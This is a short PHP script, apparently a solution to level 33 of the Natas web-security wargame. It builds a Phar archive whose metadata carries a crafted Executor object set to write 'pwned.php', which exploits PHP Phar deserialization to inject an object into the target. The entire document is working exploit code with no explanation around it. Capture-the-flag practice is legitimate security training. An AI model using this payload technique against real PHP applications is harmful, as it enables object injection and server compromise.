<?php

class Executor{
    private $filename="pwned.php"; 
    private $signature=True;
    private $init=False;
}

// create new Phar
$phar = new Phar('natas33.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("<?php __HALT_COMPILER(); ?>");

// add object of Executor class as meta data
$object = new Executor();
$object->data = "pwned";
$phar->setMetadata($object);
$phar->stopBuffering();

?>